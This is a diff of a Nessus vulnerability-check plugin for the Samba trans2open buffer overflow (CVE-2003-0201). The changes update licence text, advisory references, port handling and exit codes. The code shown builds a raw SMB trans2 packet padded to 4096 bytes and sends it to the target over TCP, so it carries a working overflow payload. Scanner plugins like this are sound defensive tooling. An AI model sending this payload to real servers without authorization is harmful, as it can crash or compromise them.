@@ -1,7 +1,5 @@
 #
-# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
-#
-# See the Nessus Scripts License for details
+# (C) Tenable Network Security
 #
 # Ref:
 #  Date: Mon, 7 Apr 2003 07:44:58 +0000 (UTC)
@@ -13,10 +11,13 @@
 if(description)
 {
  script_id(11523);
- script_cve_id("CAN-2003-0201", "CAN-2003-0196");
- script_bugtraq_id(7294);
+ script_bugtraq_id(7294, 7295);
+ script_cve_id("CVE-2003-0201", "CVE-2003-0196");
+ if ( defined_func("script_xref") ) script_xref(name:"RHSA", value:"RHSA-2003:137-02");
+ if ( defined_func("script_xref") ) script_xref(name:"SuSE", value:"SUSE-SA:2003:025");
+
  
- script_version ("$Revision: 1.5 $");
+ script_version ("$Revision: 1.14 $");
 
  name["english"] = "Samba trans2open buffer overflow";
 
@@ -42,13 +43,12 @@ Risk factor : High";
  script_category(ACT_ATTACK);
  
  
- script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
-		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
+ script_copyright(english:"This script is Copyright (C) 2003 - 2005 Tenable Network Security");
  family["english"] = "Gain root remotely";
- family["francais"] = "Passer root à distance";
  script_family(english:family["english"], francais:family["francais"]);
  script_dependencie("smb_nativelanman.nasl");
  script_require_keys("SMB/samba");
+ script_require_ports(139,445);
  exit(0);
 }
 
@@ -56,9 +56,8 @@ Risk factor : High";
 # The script code starts here
 #
 include("smb_nt.inc");  # for smb_recv()
-port = get_kb_item("SMB/transport");
-if(!port)port = 139;
-if(!get_port_state(port))exit(0);
+port = kb_smb_transport();
+if(!get_port_state(port))exit(1);
 
 
 
@@ -81,12 +80,12 @@ trans2 = raw_string(
         0x64, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x07, 0x0c, 0x00, 0xd0, 0x07, 0x0c, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x07, 0x43, 0x00, 0x0c, 0x00, 0x14, 0x08, 0x01,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90) +
-        crap(4096 - strlen(trans2));
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90);
+trans2 +=  crap(4096 - strlen(trans2));
         
         
 soc = open_sock_tcp(port);
-if(!soc)exit(0);
+if(!soc)exit(1);
 
 
 send(socket:soc, data:ssetup);
